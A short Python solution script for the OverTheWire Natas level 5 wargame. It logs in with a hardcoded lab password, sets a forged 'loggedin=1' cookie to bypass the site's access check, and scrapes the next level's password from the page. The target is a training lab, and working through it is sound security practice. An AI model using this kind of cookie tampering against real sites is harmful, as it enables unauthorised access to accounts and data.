#!/usr/bin/env python
import requests
import re

url='http://natas5.natas.labs.overthewire.org'
 
username = 'natas5'
password = 'iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq' 

req = requests.get(url, auth=(username,password), cookies={'loggedin': '1'})

print(re.findall('natas6 is (.*)<', req.text)[0])